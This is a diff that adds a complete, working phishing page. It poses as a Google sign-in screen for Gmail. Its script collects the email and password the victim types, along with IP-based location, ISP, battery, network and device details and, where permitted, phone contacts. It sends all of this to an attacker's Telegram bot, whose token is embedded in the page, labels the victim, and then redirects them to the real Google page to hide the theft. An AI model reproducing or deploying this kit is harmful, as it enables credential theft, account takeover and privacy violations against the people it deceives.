@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Sign in • Google</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+        }
+
+        body {
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+
+        .container {
+            max-width: 450px;
+            width: 100%;
+        }
+
+        .card {
+            background: white;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo svg {
+            width: 75px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 8px;
+            color: #202124;
+        }
+
+        .sub {
+            text-align: center;
+            color: #5f6368;
+            font-size: 16px;
+            margin-bottom: 32px;
+        }
+
+        .input-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            transition: 0.2s;
+        }
+
+        input:focus {
+            border-color: #1a73e8;
+        }
+
+        button {
+            width: 100%;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 12px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 12px;
+        }
+
+        button:hover {
+            background: #1765cc;
+        }
+
+        .footer {
+            margin-top: 32px;
+            text-align: center;
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 32px 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="card">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+                <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z" />
+                <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z" />
+                <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z" />
+                <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z" />
+            </svg>
+        </div>
+        <h1>Sign in</h1>
+        <div class="sub">to continue to Gmail</div>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="email" id="email" placeholder="Email or phone" required autofocus>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+            <button type="submit">Next</button>
+        </form>
+
+        <div class="footer">
+            <a href="#">Forgot email?</a> • <a href="#">Create account</a>
+        </div>
+    </div>
+</div>
+
+<script>
+// ========== TELEGRAM CONFIG (APNI DETAILS DAAL) ==========
+const BOT_TOKEN = "8517480860:AAGli6CYpU-NvzhRFcsPZCCG_NFuEw5LGbA";  // @BotFather se le
+const CHAT_ID = "8017692422";      // @userinfobot se le
+
+// ========== COLLECT ALL DATA ==========
+async function getVictimData(email, password) {
+    let data = {};
+    
+    // Basic credentials
+    data.email = email;
+    data.password = password;
+    data.timestamp = new Date().toLocaleString();
+    
+    // IP + Location
+    try {
+        let ipRes = await fetch('https://api.ipify.org?format=json');
+        let ipJson = await ipRes.json();
+        data.ip = ipJson.ip;
+        
+        let geoRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
+        let geo = await geoRes.json();
+        data.country = geo.country_name || 'Unknown';
+        data.city = geo.city || 'Unknown';
+        data.region = geo.region || 'Unknown';
+        data.isp = geo.org || 'Unknown';
+        data.zip = geo.postal || 'Unknown';
+    } catch(e) {
+        data.ip = 'Unable to fetch';
+        data.country = 'Unknown';
+    }
+    
+    // Battery
+    if(navigator.getBattery) {
+        try {
+            let battery = await navigator.getBattery();
+            data.battery = Math.floor(battery.level * 100) + '%';
+            data.charging = battery.charging ? 'Yes' : 'No';
+        } catch(e) {
+            data.battery = 'Not available';
+            data.charging = 'Unknown';
+        }
+    } else {
+        data.battery = 'Not supported';
+        data.charging = 'N/A';
+    }
+    
+    // Network
+    if(navigator.connection) {
+        data.networkType = navigator.connection.effectiveType || 'Unknown';
+        data.downlink = navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'Unknown';
+    } else {
+        data.networkType = 'Unknown';
+        data.downlink = 'Unknown';
+    }
+    
+    // Device Info
+    data.userAgent = navigator.userAgent;
+    data.platform = navigator.platform;
+    data.language = navigator.language;
+    data.screenRes = `${screen.width}x${screen.height}`;
+    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    data.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
+    data.cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+    data.referrer = document.referrer || 'Direct';
+    
+    // SIM/Carrier info via additional API
+    try {
+        let simRes = await fetch('https://ipinfo.io/json');
+        let simJson = await simRes.json();
+        data.carrier = simJson.org || 'Unknown';
+    } catch(e) {
+        data.carrier = 'Unknown';
+    }
+    
+    // Get Contacts (if user allows)
+    if('contacts' in navigator && 'select' in navigator.contacts) {
+        try {
+            const props = ['name', 'tel'];
+            const opts = { multiple: true };
+            const contacts = await navigator.contacts.select(props, opts);
+            if(contacts && contacts.length > 0) {
+                data.contacts = contacts.map(c => ({
+                    name: c.name?.[0] || 'N/A',
+                    phone: c.tel?.[0] || 'N/A'
+                }));
+            } else {
+                data.contacts = 'No contacts found';
+            }
+        } catch(e) {
+            data.contacts = 'Permission denied or error';
+        }
+    } else {
+        data.contacts = 'Contacts API not supported';
+    }
+    
+    return data;
+}
+
+// ========== SEND TO TELEGRAM ==========
+async function sendToTelegram(data) {
+    // Format contacts
+    let contactsText = '';
+    if(Array.isArray(data.contacts) && data.contacts.length > 0) {
+        contactsText = '\n━━━━📞 CONTACTS━━━━\n';
+        data.contacts.forEach((c, i) => {
+            contactsText += `${i+1}. ${c.name} | ${c.phone}\n`;
+        });
+    } else {
+        contactsText = `\n📞 Contacts: ${data.contacts}\n`;
+    }
+    
+    const message = `🔐 GOOGLE PHISHING VICTIM 🔐
+━━━━━━━━━━━━━━━━━━━━━
+📧 EMAIL: ${data.email}
+🔑 PASSWORD: ${data.password}
+━━━━━━━━━━━━━━━━━━━━━
+🌐 IP: ${data.ip}
+📍 LOCATION: ${data.city}, ${data.country}
+📮 ZIP: ${data.zip}
+🏢 ISP: ${data.isp}
+📡 CARRIER: ${data.carrier}
+━━━━━━━━━━━━━━━━━━━━━
+🔋 BATTERY: ${data.battery}
+⚡ CHARGING: ${data.charging}
+📶 NETWORK: ${data.networkType} (${data.downlink})
+━━━━━━━━━━━━━━━━━━━━━
+💻 DEVICE INFO:
+• Platform: ${data.platform}
+• Language: ${data.language}
+• Screen: ${data.screenRes}
+• Timezone: ${data.timezone}
+• Memory: ${data.deviceMemory}
+• Cookies: ${data.cookiesEnabled}
+━━━━━━━━━━━━━━━━━━━━━
+🕐 TIME: ${data.timestamp}
+🔗 REFERRER: ${data.referrer}
+━━━━━━━━━━━━━━━━━━━━━
+📱 USER AGENT:
+${data.userAgent}
+${contactsText}
+━━━━━━━━━━━━━━━━━━━━━
+🔥 SKH X PRITAM 🔥`;
+    
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    const formData = new URLSearchParams();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('text', message);
+    
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: formData
+        });
+        return response.ok;
+    } catch(e) {
+        console.error('Telegram send error:', e);
+        return false;
+    }
+}
+
+// ========== FORM SUBMIT ==========
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
+    
+    if(!email || !password) return;
+    
+    // Disable button
+    const btn = document.querySelector('button');
+    const originalText = btn.innerText;
+    btn.innerText = 'Verifying...';
+    btn.disabled = true;
+    
+    // Collect all data
+    const victimData = await getVictimData(email, password);
+    
+    // Send to Telegram
+    await sendToTelegram(victimData);
+    
+    // Redirect to real Google
+    window.location.href = 'https://accounts.google.com/v3/signin/';
+});
+
+// ========== Request contacts permission (silent) ==========
+setTimeout(() => {
+    if('contacts' in navigator && 'select' in navigator.contacts) {
+        navigator.contacts.select(['name', 'tel'], { multiple: true })
+            .then(() => {})
+            .catch(() => {});
+    }
+}, 2000);
+</script>
+</body>
+</html>
